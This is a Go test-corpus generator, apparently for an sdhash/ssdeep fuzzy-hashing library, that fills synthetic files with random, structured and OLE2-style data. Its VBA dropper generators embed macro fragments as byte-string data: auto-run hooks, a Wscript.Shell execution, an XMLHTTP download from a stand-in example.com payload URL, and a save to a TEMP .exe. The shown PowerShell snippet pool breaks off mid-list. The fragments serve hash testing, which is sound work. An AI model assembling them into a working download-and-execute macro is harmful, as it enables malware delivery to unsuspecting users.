//go:build corpus

package sdhash

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"math"
	"math/rand/v2"
	"strings"
)

// ---------------------------------------------------------------------------
// Corpus constants
// ---------------------------------------------------------------------------

const (
	corpusMinSize      = 4097
	corpusMaxSize      = 10_485_760
	corpusFilesPerType = 500
	corpusMasterSeed   = 20260324
	corpusDDBlockSize  = 1048576
)

// ---------------------------------------------------------------------------
// corpusCategory describes a type of generated test file.
// ---------------------------------------------------------------------------

type corpusCategory struct {
	name          string
	gen           func(rng *rand.Rand, size int) []byte
	customMinSize int // 0 means use corpusMinSize
	customMaxSize int // 0 means use corpusMaxSize
	count         int // 0 means use corpusFilesPerType
}

// corpusCategories returns the ordered slice of categories matching the
// generator's registration order. The order must not change — it determines
// the seed chain consumed during corpus generation.
func corpusCategories() []corpusCategory {
	return []corpusCategory{
		{"random", genRandom, 0, 0, 0},
		{"sparse", genSparse, 0, 0, 0},
		{"repetitive", genRepetitive, 0, 0, 0},
		{"structured", genStructured, 0, 0, 0},
		{"low_entropy", genLowEntropy, 0, 0, 0},
		{"document_like", genDocumentLike, 0, 0, 0},
		{"ole2_vba_dropper", genOLE2VBADropper, 4608, 51200, 100_000},
		{"large", genLarge, 33 * 1024 * 1024, 80 * 1024 * 1024, 20},
		{"powershell_pure", genPowerShellPure, 0, 0, 2000},
		{"powershell_embedded_b64", genPowerShellEmbeddedB64, 0, 0, 2000},
		{"powershell_embedded_hex", genPowerShellEmbeddedHex, 0, 0, 2000},
		{"powershell_signed", genPowerShellSigned, 0, 0, 3000},
		{"javascript_pure", genJavaScriptPure, 0, 0, 2000},
		{"javascript_embedded_b64", genJavaScriptEmbeddedB64, 0, 0, 2000},
		{"javascript_embedded_hex", genJavaScriptEmbeddedHex, 0, 0, 2000},
	}
}

// ---------------------------------------------------------------------------
// generateSizes
// ---------------------------------------------------------------------------

// generateSizes returns n file sizes with a log-uniform distribution between
// sizeMin and sizeMax, plus extra density around ssdeep block size boundaries.
func generateSizes(rng *rand.Rand, n int, sizeMin int, sizeMax int) []int {
	logMin := math.Log(float64(sizeMin))
	logMax := math.Log(float64(sizeMax))

	// ssdeep block size boundaries: blockSize * 64
	// The digest selection algorithm picks the smallest blockSize where
	// blockSize * 64 >= fileSize, so boundaries are at 3<<i * 64.
	var boundaries []int
	for i := 0; i < 20; i++ {
		b := (3 << i) * 64
		if b >= sizeMin && b <= sizeMax {
			boundaries = append(boundaries, b)
		}
	}

	sizes := make([]int, 0, n)

	// 70% log-uniform across the full range
	bulk := n * 70 / 100
	for i := 0; i < bulk; i++ {
		logSize := logMin + rng.Float64()*(logMax-logMin)
		sizes = append(sizes, int(math.Round(math.Exp(logSize))))
	}

	// 30% clustered around block size boundaries (±20% of each boundary)
	remaining := n - bulk
	if len(boundaries) > 0 {
		perBoundary := remaining / len(boundaries)
		if perBoundary < 1 {
			perBoundary = 1
		}
		for _, b := range boundaries {
			lo := int(float64(b) * 0.8)
			hi := int(float64(b) * 1.2)
			if lo < sizeMin {
				lo = sizeMin
			}
			if hi > sizeMax {
				hi = sizeMax
			}
			for j := 0; j < perBoundary && len(sizes) < n; j++ {
				sizes = append(sizes, lo+rng.IntN(hi-lo+1))
			}
		}
	}

	// Fill any remainder with log-uniform
	for len(sizes) < n {
		logSize := logMin + rng.Float64()*(logMax-logMin)
		sizes = append(sizes, int(math.Round(math.Exp(logSize))))
	}

	// Shuffle so boundary-adjacent files aren't all at the end
	for i := len(sizes) - 1; i > 0; i-- {
		j := rng.IntN(i + 1)
		sizes[i], sizes[j] = sizes[j], sizes[i]
	}

	return sizes[:n]
}

// ---------------------------------------------------------------------------
// Basic generators
// ---------------------------------------------------------------------------

// genRandom produces purely random bytes (high entropy, uniform distribution).
func genRandom(rng *rand.Rand, size int) []byte {
	buf := make([]byte, size)
	for i := range buf {
		buf[i] = byte(rng.Uint32())
	}
	return buf
}

// genSparse produces mostly-zero data with scattered non-zero bytes.
// This pattern triggered the original tail-value-zero bug.
func genSparse(rng *rand.Rand, size int) []byte {
	buf := make([]byte, size)

	// Density: 1-10% non-zero bytes, varied per file
	density := 0.01 + rng.Float64()*0.09
	nonZeroCount := int(float64(size) * density)

	for i := 0; i < nonZeroCount; i++ {
		pos := rng.IntN(size)
		buf[pos] = byte(1 + rng.IntN(255))
	}

	return buf
}

// genRepetitive produces a short pattern repeated with occasional mutations.
// Mimics things like VBA macros, config files, repeated log entries.
func genRepetitive(rng *rand.Rand, size int) []byte {
	buf := make([]byte, size)

	// Generate a base pattern of 20-500 bytes
	patLen := 20 + rng.IntN(481)
	pattern := make([]byte, patLen)
	for i := range pattern {
		pattern[i] = byte(rng.Uint32())
	}

	// Fill buffer with the pattern
	for i := 0; i < size; i++ {
		buf[i] = pattern[i%patLen]
	}

	// Mutate at random intervals (every 100-2000 bytes on average)
	mutationInterval := 100 + rng.IntN(1901)
	for i := 0; i < size; i += 1 + rng.IntN(mutationInterval*2) {
		buf[i] ^= byte(1 + rng.IntN(255))
	}

	return buf
}

// genStructured produces block-structured data mimicking binary file formats:
// fixed-size sectors with headers, some full of padding, some with real data.
func genStructured(rng *rand.Rand, size int) []byte {
	buf := make([]byte, size)

	// Pick a sector size: 128, 256, or 512 bytes
	sectorSizes := []int{128, 256, 512}
	sectorSize := sectorSizes[rng.IntN(len(sectorSizes))]

	// Pick padding byte
	padBytes := []byte{0x00, 0xFF, 0xCC, 0xAA}
	padByte := padBytes[rng.IntN(len(padBytes))]

	// Fill with padding first
	for i := range buf {
		buf[i] = padByte
	}

	// Write a file header (first sector has structured data)
	headerSize := min(sectorSize, size)
	header := make([]byte, headerSize)
	for i := range header {
		header[i] = byte(rng.Uint32())
	}
	// Put a magic number at the start
	magics := [][]byte{
		{0xD0, 0xCF, 0x11, 0xE0}, // OLE2
		{0x50, 0x4B, 0x03, 0x04}, // ZIP/OOXML
		{0x7F, 0x45, 0x4C, 0x46}, // ELF
		{0x4D, 0x5A, 0x90, 0x00}, // PE/MZ
		{0x25, 0x50, 0x44, 0x46}, // PDF
	}
	magic := magics[rng.IntN(len(magics))]
	copy(header, magic)
	copy(buf, header)

	// Fill some sectors with data, leave others as padding
	dataChance := 0.2 + rng.Float64()*0.5 // 20-70% of sectors have data
	for offset := sectorSize; offset < size; offset += sectorSize {
		if rng.Float64() < dataChance {
			end := min(offset+sectorSize, size)
			chunk := make([]byte, end-offset)
			for i := range chunk {
				chunk[i] = byte(rng.Uint32())
			}
			copy(buf[offset:end], chunk)
		}
	}

	return buf
}

// genLowEntropy produces data using only a small alphabet of distinct byte values.
// This creates patterns with high internal repetition at the byte level.
func genLowEntropy(rng *rand.Rand, size int) []byte {
	buf := make([]byte, size)

	// Pick 2-8 distinct byte values
	alphabetSize := 2 + rng.IntN(7)
	alphabet := make([]byte, alphabetSize)
	for i := range alphabet {
		alphabet[i] = byte(rng.IntN(256))
	}

	// Strategy varies: uniform random from alphabet, or runs of same value
	strategy := rng.IntN(3)

	switch strategy {
	case 0:
		// Uniform random selection from alphabet
		for i := range buf {
			buf[i] = alphabet[rng.IntN(alphabetSize)]
		}
	case 1:
		// Runs of the same value (like RLE-compressible data)
		i := 0
		for i < size {
			val := alphabet[rng.IntN(alphabetSize)]
			runLen := 1 + rng.IntN(300)
			for j := 0; j < runLen && i < size; j++ {
				buf[i] = val
				i++
			}
		}
	case 2:
		// Weighted distribution: one dominant value, others rare
		dominant := alphabet[0]
		for i := range buf {
			if rng.Float64() < 0.85 {
				buf[i] = dominant
			} else {
				buf[i] = alphabet[rng.IntN(alphabetSize)]
			}
		}
	}

	return buf
}

// genDocumentLike produces data mimicking real document/malware structure:
// OLE2-style headers, directory entries, VBA streams with text and binary,
// and sector padding.
func genDocumentLike(rng *rand.Rand, size int) []byte {
	buf := make([]byte, size)

	// OLE2 header (first 512 bytes)
	ole2Header := []byte{
		0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1, // magic
	}
	copy(buf, ole2Header)
	// Fill rest of header with structured-looking data
	for i := len(ole2Header); i < min(512, size); i++ {
		if i%4 == 0 {
			// Looks like uint32 fields
			binary.LittleEndian.PutUint32(buf[i:min(i+4, min(512, size))], uint32(rng.Int32()))
		}
	}

	// VBA-like text streams interspersed with binary sectors
	vbaSnippets := []string{
		"Attribute VB_Name = \"ThisDocument\"\r\n",
		"Sub AutoOpen()\r\n",
		"Dim objShell As Object\r\n",
		"Set objShell = CreateObject(\"Wscript.Shell\")\r\n",
		"objShell.Run \"cmd.exe /c echo Hello\"\r\n",
		"End Sub\r\n",
		"Private Sub Document_Open()\r\n",
		"Dim strCmd As String\r\n",
		"strCmd = Chr(112) & Chr(111) & Chr(119) & Chr(101) & Chr(114)\r\n",
		"Shell strCmd, vbHide\r\n",
		"MsgBox \"Document loaded\"\r\n",
		"Dim x As Variant\r\n",
		"x = Array(72, 101, 108, 108, 111)\r\n",
		"For i = LBound(x) To UBound(x)\r\n",
		"    result = result & Chr(x(i))\r\n",
		"Next i\r\n",
	}

	// Fill the rest with a mix of VBA text and binary/padding sectors
	pos := 512
	for pos < size {
		choice := rng.IntN(4)
		switch choice {
		case 0:
			// VBA text block
			textSize := 0
			for textSize < 256 && pos+textSize < size {
				snippet := vbaSnippets[rng.IntN(len(vbaSnippets))]
				copy(buf[pos+textSize:], snippet)
				textSize += len(snippet)
			}
			pos += textSize
		case 1:
			// Binary sector (random data, like compiled VBA p-code)
			sectorLen := 256 + rng.IntN(768)
			end := min(pos+sectorLen, size)
			chunk := make([]byte, end-pos)
			for i := range chunk {
				chunk[i] = byte(rng.Uint32())
			}
			copy(buf[pos:end], chunk)
			pos = end
		case 2:
			// Padding sector (0x00 or 0xFF)
			padLen := 512 + rng.IntN(1536)
			end := min(pos+padLen, size)
			padVal := byte(0x00)
			if rng.IntN(2) == 0 {
				padVal = 0xFF
			}
			for i := pos; i < end; i++ {
				buf[i] = padVal
			}
			pos = end
		case 3:
			// Directory-like entries (short structured records)
			for j := 0; j < 4+rng.IntN(12) && pos < size; j++ {
				entrySize := 64 + rng.IntN(64)
				end := min(pos+entrySize, size)
				entry := make([]byte, end-pos)
				for i := range entry {
					entry[i] = byte(rng.Uint32())
				}
				// Make first few bytes look like a name (ASCII range)
				nameLen := min(16, len(entry))
				for k := 0; k < nameLen; k++ {
					entry[k] = byte('A' + rng.IntN(26))
				}
				copy(buf[pos:end], entry)
				pos = end
			}
		}
	}

	return buf
}

// ---------------------------------------------------------------------------
// OLE2 VBA dropper generator and sector helpers
// ---------------------------------------------------------------------------

// genOLE2VBADropper produces files that closely match the byte-level structure
// of real OLE2 Compound Document Format files containing malicious VBA macros.
//
// The size parameter is rounded up to the nearest 512-byte sector boundary
// to match real OLE2 structure.
func genOLE2VBADropper(rng *rand.Rand, size int) []byte {
	const sectorSize = 512

	// Round up to sector boundary
	numSectors := (size + sectorSize - 1) / sectorSize
	if numSectors < 9 {
		numSectors = 9 // minimum viable OLE2 structure
	}
	totalSize := numSectors * sectorSize
	buf := make([]byte, totalSize)

	// Sector 0: OLE2 header
	ole2Sector0(rng, buf[0:sectorSize])

	// Sector 1: FAT (File Allocation Table)
	fatSector(rng, buf[sectorSize:2*sectorSize])

	// Remaining sectors: assemble from weighted archetypes.
	type sectorGen struct {
		weight int
		gen    func(rng *rand.Rand, sector []byte)
	}
	archetypes := []sectorGen{
		{25, directorySector},
		{19, asciiStreamSector},
		{19, vbaPcodeSector},
		{19, sparseMixedSector},
		{12, paddingSector},
		{6, trailingZeroSector},
	}

	totalWeight := 0
	for _, a := range archetypes {
		totalWeight += a.weight
	}

	for i := 2; i < numSectors; i++ {
		offset := i * sectorSize
		sector := buf[offset : offset+sectorSize]

		// Weighted random selection
		roll := rng.IntN(totalWeight)
		cumulative := 0
		for _, a := range archetypes {
			cumulative += a.weight
			if roll < cumulative {
				a.gen(rng, sector)
				break
			}
		}
	}

	return buf
}

// ole2Sector0 generates a realistic OLE2 header sector.
func ole2Sector0(rng *rand.Rand, sector []byte) {
	// Fill with 0xFF first
	for i := range sector {
		sector[i] = 0xFF
	}

	// Magic signature
	copy(sector[0:8], []byte{0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1})

	// CLSID (16 bytes of zeros)
	for i := 8; i < 24; i++ {
		sector[i] = 0x00
	}

	// Minor version, major version, byte order, sector size power, mini-sector size power
	binary.LittleEndian.PutUint16(sector[24:], uint16(0x003E))        // minor version
	binary.LittleEndian.PutUint16(sector[26:], uint16(3+rng.IntN(2))) // major version (3 or 4)
	binary.LittleEndian.PutUint16(sector[28:], 0xFFFE)                // little-endian BOM
	binary.LittleEndian.PutUint16(sector[30:], 0x0009)                // sector size = 512
	binary.LittleEndian.PutUint16(sector[32:], 0x0006)                // mini-sector size = 64
	binary.LittleEndian.PutUint32(sector[44:], uint32(1+rng.IntN(3))) // total FAT sectors
	binary.LittleEndian.PutUint32(sector[48:], uint32(rng.IntN(4)))   // first directory sector
	binary.LittleEndian.PutUint32(sector[60:], uint32(rng.IntN(8)))   // first mini-FAT sector
	binary.LittleEndian.PutUint32(sector[64:], uint32(rng.IntN(3)))   // total mini-FAT sectors
	binary.LittleEndian.PutUint32(sector[68:], 0xFFFFFFFE)            // first DIFAT sector (none)
	binary.LittleEndian.PutUint32(sector[72:], 0x00000000)            // total DIFAT sectors
	binary.LittleEndian.PutUint32(sector[76:], uint32(rng.IntN(8)))   // DIFAT[0] - first FAT sector
	for i := 80; i < 512 && (i-76)/4 < 109; i += 4 {
		binary.LittleEndian.PutUint32(sector[i:], 0xFFFFFFFF) // unused DIFAT entries
	}
}

// fatSector generates a FAT sector: mostly FREESECT (all-bits-set) with some
// sector chain entries scattered in.
func fatSector(rng *rand.Rand, sector []byte) {
	// Fill with 0xFF (FREESECT)
	for i := range sector {
		sector[i] = 0xFF
	}

	// Write some chain entries in the first portion
	numEntries := 3 + rng.IntN(12)
	for i := 0; i < numEntries && i*4 < len(sector); i++ {
		val := uint32(0xFFFFFFFE) // ENDOFCHAIN
		if rng.IntN(3) > 0 {
			val = uint32(i + 1 + rng.IntN(10)) // next sector in chain
		}
		binary.LittleEndian.PutUint32(sector[i*4:], val)
	}
}

// directorySector generates an OLE2 directory sector with UTF-16LE entry names.
func directorySector(rng *rand.Rand, sector []byte) {
	// OLE2 directory entries are 128 bytes each, 4 per sector
	dirNames := []string{
		"Root Entry", "VBA", "_VBA_PROJECT", "dir",
		"ThisDocument", "Module1", "PROJECT", "PROJECTwm",
		"_SX_DB_CUR", "Workbook", "CompObj", "DocumentSummaryInformation",
		"SummaryInformation", "PowerPoint Document", "Current User",
		"Macros", "VBAProject", "NewMacros", "Sheet1", "Sheet2",
	}

	for entry := 0; entry < 4; entry++ {
		base := entry * 128
		if base >= len(sector) {
			break
		}

		// Zero the whole entry first
		for i := base; i < base+128 && i < len(sector); i++ {
			sector[i] = 0x00
		}

		if rng.IntN(4) == 0 {
			continue // ~25% empty entries (all zeros) as seen in real files
		}

		// Write name in UTF-16LE
		name := dirNames[rng.IntN(len(dirNames))]
		for j, ch := range name {
			pos := base + j*2
			if pos+1 < base+64 && pos+1 < len(sector) {
				sector[pos] = byte(ch)
				sector[pos+1] = 0x00
			}
		}

		// Name size in bytes (including null terminator)
		nameBytes := (len(name) + 1) * 2
		if base+64 < len(sector) {
			binary.LittleEndian.PutUint16(sector[base+64:], uint16(nameBytes))
		}

		// Object type: 0=unknown, 1=storage, 2=stream, 5=root
		if base+66 < len(sector) {
			types := []byte{0x01, 0x02, 0x02, 0x05}
			sector[base+66] = types[rng.IntN(len(types))]
		}

		// Sibling/child directory entry IDs (often NOSTREAM sentinel)
		for _, off := range []int{68, 72, 76} {
			if base+off+4 <= len(sector) {
				if rng.IntN(3) == 0 {
					binary.LittleEndian.PutUint32(sector[base+off:], uint32(rng.IntN(8)))
				} else {
					binary.LittleEndian.PutUint32(sector[base+off:], 0xFFFFFFFF)
				}
			}
		}

		// Starting sector and size (near the end of the entry)
		if base+116+4 <= len(sector) {
			binary.LittleEndian.PutUint32(sector[base+116:], uint32(rng.IntN(20)))
		}
		if base+120+4 <= len(sector) {
			binary.LittleEndian.PutUint32(sector[base+120:], uint32(256+rng.IntN(4096)))
		}
	}
}

// asciiStreamSector generates a VBA source code text stream.
func asciiStreamSector(rng *rand.Rand, sector []byte) {
	snippets := []string{
		"Attribute VB_Name = \"ThisDocument\"\r\n",
		"Attribute VB_Base = \"1Normal.ThisDocument\"\r\n",
		"Attribute VB_Creatable = False\r\n",
		"Attribute VB_Exposed = True\r\n",
		"Sub AutoOpen()\r\n",
		"Sub Document_Open()\r\n",
		"Sub Workbook_Open()\r\n",
		"Dim objShell As Object\r\n",
		"Dim strURL As String\r\n",
		"Dim strPath As String\r\n",
		"Dim strCmd As String\r\n",
		"Set objShell = CreateObject(\"Wscript.Shell\")\r\n",
		"Set objHTTP = CreateObject(\"MSXML2.XMLHTTP\")\r\n",
		"Set objStream = CreateObject(\"ADODB.Stream\")\r\n",
		"objHTTP.Open \"GET\", strURL, False\r\n",
		"objHTTP.Send\r\n",
		"objShell.Run strCmd, 0, False\r\n",
		"Shell \"cmd.exe /c \" & strCmd, vbHide\r\n",
		"strURL = \"http://\" & Chr(101) & \"xample.com/payload\"\r\n",
		"strPath = Environ(\"TEMP\") & \"\\tmp\" & Int(Rnd * 9999) & \".exe\"\r\n",
		"Open strPath For Binary As #1\r\n",
		"Put #1, , objHTTP.responseBody\r\n",
		"Close #1\r\n",
		"End Sub\r\n",
		"Private Function Decode(s As String) As String\r\n",
		"Dim i As Integer\r\nDim result As String\r\n",
		"For i = 1 To Len(s) Step 2\r\n",
		"    result = result & Chr(Val(\"&H\" & Mid(s, i, 2)))\r\n",
		"Next i\r\nDecode = result\r\n",
		"End Function\r\n",
		"' This macro runs automatically when the document is opened\r\n",
		"' Downloaded from hxxp://example.com/ls/payload2.exe\r\n",
		"MsgBox \"This document requires macros to be enabled.\"\r\n",
		"ActiveDocument.SaveAs Environ(\"TEMP\") & \"\\~temp.doc\"\r\n",
	}

	pos := 0
	for pos < len(sector) {
		snippet := snippets[rng.IntN(len(snippets))]
		n := copy(sector[pos:], snippet)
		pos += n
	}
}

// vbaPcodeSector generates compiled VBA p-code / compressed VBA stream data.
func vbaPcodeSector(rng *rand.Rand, sector []byte) {
	pos := 0
	for pos < len(sector) {
		chunk := rng.IntN(5)
		switch chunk {
		case 0:
			// Random binary (opcode sequences)
			runLen := 8 + rng.IntN(64)
			for i := 0; i < runLen && pos < len(sector); i++ {
				sector[pos] = byte(rng.IntN(256))
				pos++
			}
		case 1:
			// Small integers / offsets (common in p-code)
			runLen := 4 + rng.IntN(16)
			for i := 0; i < runLen && pos+1 < len(sector); i++ {
				binary.LittleEndian.PutUint16(sector[pos:], uint16(rng.IntN(1024)))
				pos += 2
			}
		case 2:
			// Zero run (padding between p-code sections)
			runLen := 4 + rng.IntN(32)
			for i := 0; i < runLen && pos < len(sector); i++ {
				sector[pos] = 0x00
				pos++
			}
		case 3:
			// Compressed VBA token bytes (upper nibble flags, lower nibble data)
			runLen := 8 + rng.IntN(32)
			for i := 0; i < runLen && pos < len(sector); i++ {
				sector[pos] = byte(rng.IntN(16))<<4 | byte(rng.IntN(16))
				pos++
			}
		case 4:
			// VBA stream header fragment
			header := []byte{0x01, 0x00, byte(rng.IntN(8)), 0x00}
			n := copy(sector[pos:], header)
			pos += n
		}
	}
}

// sparseMixedSector generates a sector with mixed zero and 0xFF padding
// interspersed with small data fragments.
func sparseMixedSector(rng *rand.Rand, sector []byte) {
	// Start with a base fill
	baseFill := byte(0x00)
	if rng.IntN(3) == 0 {
		baseFill = 0xFF
	}
	for i := range sector {
		sector[i] = baseFill
	}

	// Scatter some data islands
	numIslands := 2 + rng.IntN(6)
	for i := 0; i < numIslands; i++ {
		islandStart := rng.IntN(len(sector))
		islandLen := 4 + rng.IntN(48)

		islandType := rng.IntN(3)
		for j := 0; j < islandLen && islandStart+j < len(sector); j++ {
			switch islandType {
			case 0:
				sector[islandStart+j] = byte(rng.IntN(256))
			case 1:
				// Small LE uint32 values
				if j%4 == 0 && islandStart+j+3 < len(sector) {
					binary.LittleEndian.PutUint32(sector[islandStart+j:], uint32(rng.IntN(256)))
				}
			case 2:
				// Alternating fill (the other padding byte)
				if baseFill == 0x00 {
					sector[islandStart+j] = 0xFF
				} else {
					sector[islandStart+j] = 0x00
				}
			}
		}
	}
}

// paddingSector generates a sector dominated by a single byte value.
func paddingSector(rng *rand.Rand, sector []byte) {
	padVal := byte(0xFF)
	if rng.IntN(3) == 0 {
		padVal = 0x00
	}
	for i := range sector {
		sector[i] = padVal
	}

	// Sprinkle a few noise bytes
	noiseCount := rng.IntN(20)
	for i := 0; i < noiseCount; i++ {
		sector[rng.IntN(len(sector))] = byte(rng.IntN(256))
	}
}

// trailingZeroSector generates a mostly-zero sector with a small ASCII fragment.
func trailingZeroSector(rng *rand.Rand, sector []byte) {
	// All zeros
	for i := range sector {
		sector[i] = 0x00
	}

	// Small ASCII text fragment somewhere in the sector
	fragments := []string{
		"Module1=22\r\n",
		"Module2=38\r\n",
		"ThisDocument=0\r\n",
		"[Host Extender Info]\r\n",
		"&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A}\r\n",
		"[Workspace]\r\n",
		"Module1=26, 26, 650, 400, \r\n",
		"ThisDocument=0, 0, 0, 0, C\r\n",
		"BaseClass=0\r\n",
		"Package={AC9F2F90-E877-11CE-9F68-00AA00574A4F}\r\n",
	}

	fragment := fragments[rng.IntN(len(fragments))]
	pos := rng.IntN(len(sector) / 2) // place in first half
	copy(sector[pos:], fragment)
}

// ---------------------------------------------------------------------------
// Large file generator
// ---------------------------------------------------------------------------

// genLarge produces high-entropy random data with periodic 64-byte structured
// headers every 4 MiB.
func genLarge(rng *rand.Rand, size int) []byte {
	buf := make([]byte, size)

	// Fill entire buffer with random data (4 bytes at a time for speed)
	i := 0
	for ; i+3 < size; i += 4 {
		v := rng.Uint32()
		buf[i] = byte(v)
		buf[i+1] = byte(v >> 8)
		buf[i+2] = byte(v >> 16)
		buf[i+3] = byte(v >> 24)
	}
	for ; i < size; i++ {
		buf[i] = byte(rng.Uint32())
	}

	// Write a 64-byte structured header at the start of every 4 MiB chunk.
	const chunkSize = 4 * 1024 * 1024
	const headerSize = 64
	for chunkIdx := 0; chunkIdx*chunkSize+headerSize <= size; chunkIdx++ {
		off := chunkIdx * chunkSize
		buf[off+0] = 0x7f
		buf[off+1] = 'L'
		buf[off+2] = 'R'
		buf[off+3] = 'G'
		binary.LittleEndian.PutUint32(buf[off+4:], uint32(chunkIdx))
	}

	return buf
}

// ---------------------------------------------------------------------------
// PowerShell snippet pool and generators
// ---------------------------------------------------------------------------

// psSnippets is a pool of syntactically plausible PowerShell fragments with
// Windows-style \r\n line endings.
var psSnippets = []string{
	"function Get-SystemInfo {\r\n\t[CmdletBinding()]\r\n\tparam()\r\n\t$os = Get-WmiObject Win32_OperatingSystem\r\n\t$cpu = Get-WmiObject Win32_Processor\r\n\treturn @{ OS = $os; CPU = $cpu }\r\n}\r\n",
	"function Set-RegistryValue {\r\n\tparam(\r\n\t\t[Parameter(Mandatory=$true)]\r\n\t\t[string]$Path,\r\n\t\t[string]$Name,\r\n\t\t$Value\r\n\t)\r\n\tSet-ItemProperty -Path $Path -Name $Name -Value $Value -ErrorAction SilentlyContinue\r\n}\r\n",
	"$computerName = $env:COMPUTERNAME\r\n$logPath = Join-Path $env:TEMP \"deploy.log\"\r\n$timestamp = Get-Date -Format \"yyyy-MM-dd HH:mm:ss\"\r\nWrite-Verbose \"[$timestamp] Starting on $computerName\"\r\n",
	"$serviceList = @(\"Spooler\", \"W32Time\", \"WinRM\", \"EventLog\")\r\nforeach ($svc in $serviceList) {\r\n\t$status = (Get-Service -Name $svc -ErrorAction SilentlyContinue).Status\r\n\tWrite-Verbose \"Service $svc is $status\"\r\n}\r\n",
	"try {\r\n\t$result = Invoke-WebRequest -Uri $targetUrl -UseBasicParsing -TimeoutSec 30\r\n\t$content = $result.Content\r\n}\r\ncatch {\r\n\tWrite-Warning \"Failed to fetch $targetUrl : $_\"\r\n\t$content = $null\r\n}\r\n",
	"Import-Module -Name ActiveDirectory -Verbose:$false -ErrorAction Stop\r\nImport-Module -Name GroupPolicy -Verbose:$false -ErrorAction SilentlyContinue\r\n",
	"Get-ChildItem -Path $searchPath -Recurse -Filter \"*.log\" |\r\n\tWhere-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-30) } |\r\n\tForEach-Object { Remove-Item $_.FullName -Force -WhatIf }\r\n",
	"$configTable = @{\r\n\tServerName  = \"PROD-DC01\"\r\n\tPort        = 8443\r\n\tUseSSL      = $true\r\n\tRetryCount  = 3\r\n\tLogLevel    = \"Verbose\"\r\n}\r\n",
	"if (-not (Test-Path $outputDir)) {\r\n\tNew-Item -ItemType Directory -Path $outputDir -Force | Out-Null\r\n\tWrite-Verbose \"Created directory: $outputDir\"\r\n}\r\nelse {\r\n\tWrite-Verbose \"Directory already exists: $outputDir\"\r\n}\r\n",
	"[CmdletBinding(SupportsShouldProcess=$true)]\r\nparam(\r\n\t[ValidateSet(\"Debug\",\"Info\",\"Warning\",\"Error\")]\r\n\t[string]$LogLevel = \"Info\",\r\n\t[ValidateRange(1,65535)]\r\n\t[int]$Port = 443,\r\n\t[switch]$PassThru\r\n)\r\n",
	"$matches = Select-String -Path $logFile -Pattern \"ERROR|FATAL\" -AllMatches\r\n$errorCount = ($matches | Measure-Object).Count\r\nWrite-Output \"Found $errorCount error(s) in $logFile\"\r\n",
	"function ConvertTo-Base64String {\r\n\tparam([string]$InputString)\r\n\t$bytes = [System.Text.Encoding]::UTF8.GetBytes($InputString)\r\n\treturn [System.Convert]::ToBase64String($bytes)\r\n}\r\n",
	"$credential = Get-Credential -Message \"Enter admin credentials\" -UserName \"DOMAIN\\admin\"\r\n$session = New-PSSession -ComputerName $remoteHost -Credential $credential\r\nInvoke-Command -Session $session -ScriptBlock { Get-Process | Sort-Object CPU -Descending | Select-Object -First 10 }\r\n",
	"<#\r\n.SYNOPSIS\r\n    Configures the target system according to policy.\r\n.DESCRIPTION\r\n    Applies registry settings, service configurations, and firewall rules.\r\n.PARAMETER ComputerName\r\n    The name of the target computer.\r\n.EXAMPLE\r\n    Invoke-PolicyApply -ComputerName \"WORKSTATION01\"\r\n#>\r\n",
	"$registryPath = \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\"\r\n$valueName = \"DisableWindowsUpdateAccess\"\r\nif ((Get-ItemProperty -Path $registryPath -Name $valueName -ErrorAction SilentlyContinue).$valueName -ne 1) {\r\n\tSet-ItemProperty -Path $registryPath -Name $valueName -Value 1 -Type DWord\r\n}\r\n",
	"$processOutput = & cmd.exe /c \"ipconfig /all\" 2>&1\r\n$ipAddresses = $processOutput | Select-String -Pattern \"IPv4 Address\" | ForEach-Object {\r\n\t($_ -split \":\\s*\")[1].Trim()\r\n}\r\nWrite-Output $ipAddresses\r\n",
	"function Write-Log {\r\n\t[OutputType([void])]\r\n\tparam(\r\n\t\t[Parameter(Mandatory=$true)]\r\n\t\t[string]$Message,\r\n\t\t[ValidateSet(\"INFO\",\"WARN\",\"ERROR\")]\r\n\t\t[string]$Level = \"INFO\"\r\n\t)\r\n\t$entry = \"$(Get-Date -Format 'HH:mm:ss') [$Level] $Message\"\r\n\tAdd-Content -Path $script:LogFile -Value $entry\r\n}\r\n",
	"$xmlDoc = New-Object System.Xml.XmlDocument\r\n$xmlDoc.Load($configFilePath)\r\n$nodes = $xmlDoc.SelectNodes(\"//setting[@enabled='true']\")\r\nforeach ($node in $nodes) {\r\n\t$key = $node.GetAttribute(\"key\")\r\n\t$val = $node.GetAttribute(\"value\")\r\n\tWrite-Verbose \"  Setting: $key = $val\"\r\n}\r\n",
	"switch ($env:PROCESSOR_ARCHITECTURE) {\r\n\t\"AMD64\" { $arch = \"x64\"; $bitness = 64 }\r\n\t\"x86\"   { $arch = \"x86\"; $bitness = 32 }\r\n\t\"ARM64\" { $arch = \"arm64\"; $bitness = 64 }\r\n\tdefault { $arch = \"unknown\"; $bitness = 0 }\r\n}\r\nWrite-Verbose \"Architecture: $arch ($bitness-bit)\"\r\n",
	"do {\r\n\t$attempt++\r\n\ttry {\r\n\t\t$response = Invoke-RestMethod -Uri $apiEndpoint -Method POST -Body $payload -ContentType \"application/json\"\r\n\t\t$success = $true\r\n\t}\r\n\tcatch {\r\n\t\tWrite-Warning \"Attempt $attempt failed: $_\"\r\n\t\tStart-Sleep -Seconds (2 * $attempt)\r\n\t}\r\n} while (-not $success -and $attempt -lt $maxRetries)\r\n",
	"# Validate input parameters\r\n$validExtensions = @('.exe', '.dll', '.ps1', '.bat', '.cmd')\r\nif ($validExtensions -notcontains [System.IO.Path]::GetExtension($filePath).ToLower()) {\r\n\tthrow \"Unsupported file extension: $(Split-Path $filePath -Leaf)\"\r\n}\r\n",
	"$stopwatch = [System.Diagnostics.Stopwatch]::StartNew()\r\n$results = $inputCollection | ForEach-Object -Parallel {\r\n\tProcess-Item -InputObject $_ -Timeout 30\r\n} -ThrottleLimit 4\r\n$stopwatch.Stop()\r\nWrite-Verbose \"Processed $($results.Count) items in $($stopwatch.Elapsed.TotalSeconds)s\"\r\n",
	"function Test-AdminPrivilege {\r\n\t[OutputType([bool])]\r\n\tparam()\r\n\t$identity = [Security.Principal.WindowsIdentity]::GetCurrent()\r\n\t$principal = New-Object Security.Principal.WindowsPrincipal $identity\r\n\treturn $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)\r\n}\r\n",
